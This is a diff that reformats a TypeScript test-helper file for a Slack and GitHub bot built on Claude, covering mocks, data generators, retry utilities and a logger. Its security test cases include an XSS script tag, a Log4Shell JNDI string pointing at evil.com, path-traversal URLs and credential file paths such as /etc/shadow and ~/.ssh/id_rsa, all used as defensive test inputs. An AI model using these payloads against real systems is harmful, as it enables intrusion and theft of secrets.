@@ -24,7 +24,10 @@ export function createMockEnvironment(overrides: Record<string, string> = {}) {
     GITHUB_TOKEN: "ghp_test_token",
     WORKSPACE_DIR: "/workspace",
     RECOVERY_MODE: "false",
-    CLAUDE_OPTIONS: JSON.stringify({ model: "claude-3-sonnet", temperature: 0.7 }),
+    CLAUDE_OPTIONS: JSON.stringify({
+      model: "claude-3-sonnet",
+      temperature: 0.7,
+    }),
     ...overrides,
   };
 }
@@ -101,9 +104,9 @@ export const mockWorkspaceSetup = {
   cleanup: jest.fn().mockResolvedValue(undefined),
   getDiskUsage: jest.fn().mockResolvedValue(1024 * 1024), // 1MB
   createSecureDirectory: jest.fn().mockResolvedValue(undefined),
-  sanitizeUserInput: jest.fn().mockImplementation((input: string) => 
-    input.replace(/[<>"`]/g, "")
-  ),
+  sanitizeUserInput: jest
+    .fn()
+    .mockImplementation((input: string) => input.replace(/[<>"`]/g, "")),
 };
 
 /**
@@ -181,7 +184,7 @@ export class MockProgressTracker {
 
   updateProgress(message: string) {
     this.updates.push(message);
-    this.callbacks.forEach(callback => callback(message));
+    this.callbacks.forEach((callback) => callback(message));
   }
 
   getUpdates(): string[] {
@@ -202,12 +205,17 @@ export class MockProgressTracker {
  * Test data generators
  */
 export const generators = {
-  randomSessionKey: () => `session-${Date.now()}-${Math.random().toString(36).substr(2, 8)}`,
-  randomUserId: () => `U${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
-  randomChannelId: () => `C${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
-  randomMessageTs: () => `${Date.now()}.${Math.random().toString().substr(2, 6)}`,
-  randomWorkspaceDir: () => `/workspace/${Math.random().toString(36).substr(2, 8)}`,
-  randomRepoUrl: (org = "test", repo = "repo") => 
+  randomSessionKey: () =>
+    `session-${Date.now()}-${Math.random().toString(36).substr(2, 8)}`,
+  randomUserId: () =>
+    `U${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
+  randomChannelId: () =>
+    `C${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
+  randomMessageTs: () =>
+    `${Date.now()}.${Math.random().toString().substr(2, 6)}`,
+  randomWorkspaceDir: () =>
+    `/workspace/${Math.random().toString(36).substr(2, 8)}`,
+  randomRepoUrl: (org = "test", repo = "repo") =>
     `https://github.com/${org}/${repo}-${Math.random().toString(36).substr(2, 5)}`,
 };
 
@@ -224,7 +232,7 @@ export const securityTestCases = {
     "<script>alert('xss')</script>",
     "${jndi:ldap://evil.com/exploit}",
   ],
-  
+
   maliciousRepoUrls: [
     "https://evil.com/malicious-repo",
     "ftp://github.com/user/repo",
@@ -232,10 +240,10 @@ export const securityTestCases = {
     "file:///etc/passwd",
     "https://github.com/../../../etc/passwd",
   ],
-  
+
   maliciousFilePaths: [
     "../../../etc/passwd",
-    "/etc/shadow", 
+    "/etc/shadow",
     "~/.ssh/id_rsa",
     "\\windows\\system32\\config\\sam",
     "/proc/self/environ",
@@ -268,7 +276,9 @@ export class MockResourceMonitor {
 
   getAverageMetric(name: string): number {
     const values = this.getMetrics(name);
-    return values.length > 0 ? values.reduce((a, b) => a + b, 0) / values.length : 0;
+    return values.length > 0
+      ? values.reduce((a, b) => a + b, 0) / values.length
+      : 0;
   }
 
   clear() {
@@ -289,8 +299,11 @@ export const timeoutUtils = {
   withTimeout<T>(promise: Promise<T>, timeoutMs: number): Promise<T> {
     return Promise.race([
       promise,
-      new Promise<never>((_, reject) => 
-        setTimeout(() => reject(new Error(`Timeout after ${timeoutMs}ms`)), timeoutMs)
+      new Promise<never>((_, reject) =>
+        setTimeout(
+          () => reject(new Error(`Timeout after ${timeoutMs}ms`)),
+          timeoutMs,
+        ),
       ),
     ]);
   },
@@ -298,25 +311,25 @@ export const timeoutUtils = {
   async retry<T>(
     operation: () => Promise<T>,
     maxAttempts: number = 3,
-    delayMs: number = 100
+    delayMs: number = 100,
   ): Promise<T> {
     let lastError: Error;
-    
+
     for (let i = 0; i < maxAttempts; i++) {
       try {
         return await operation();
       } catch (error) {
         lastError = error as Error;
         if (i < maxAttempts - 1) {
-          await new Promise(resolve => setTimeout(resolve, delayMs));
+          await new Promise((resolve) => setTimeout(resolve, delayMs));
         }
       }
     }
-    
+
     throw lastError!;
   },
 
-  delay: (ms: number) => new Promise(resolve => setTimeout(resolve, ms)),
+  delay: (ms: number) => new Promise((resolve) => setTimeout(resolve, ms)),
 };
 
 /**
@@ -330,7 +343,7 @@ export const errorSimulator = {
   gitError: () => new Error("fatal: repository not found"),
   claudeApiError: () => new Error("Claude API error: model overloaded"),
   slackApiError: () => new Error("Slack API error: channel not found"),
-  
+
   randomError: () => {
     const errors = [
       errorSimulator.networkError(),
@@ -381,7 +394,7 @@ export class TestEnvironment {
     }
 
     // Run cleanup callbacks
-    this.cleanupCallbacks.forEach(callback => {
+    this.cleanupCallbacks.forEach((callback) => {
       try {
         callback();
       } catch (error) {
@@ -400,43 +413,49 @@ export class TestEnvironment {
  */
 export const testLogger = {
   logs: [] as Array<{ level: string; message: string; timestamp: Date }>,
-  
+
   log(level: string, message: string) {
     this.logs.push({ level, message, timestamp: new Date() });
   },
-  
+
   info(message: string) {
     this.log("info", message);
   },
-  
+
   warn(message: string) {
     this.log("warn", message);
   },
-  
+
   error(message: string) {
     this.log("error", message);
   },
-  
-  getLogs(level?: string): Array<{ level: string; message: string; timestamp: Date }> {
-    return level ? this.logs.filter(log => log.level === level) : [...this.logs];
+
+  getLogs(
+    level?: string,
+  ): Array<{ level: string; message: string; timestamp: Date }> {
+    return level
+      ? this.logs.filter((log) => log.level === level)
+      : [...this.logs];
   },
-  
+
   clear() {
     this.logs = [];
   },
-  
+
   expectLog(level: string, messagePattern: string | RegExp) {
     const logs = this.getLogs(level);
-    const found = logs.some(log => {
+    const found = logs.some((log) => {
       if (typeof messagePattern === "string") {
         return log.message.includes(messagePattern);
       } else {
         return messagePattern.test(log.message);
       }
     });
-    
+
     if (!found) {
-      throw new Error(`Expected ${level} log matching ${messagePattern}, but not found`);
+      throw new Error(
+        `Expected ${level} log matching ${messagePattern}, but not found`,
+      );
     }
   },
 };
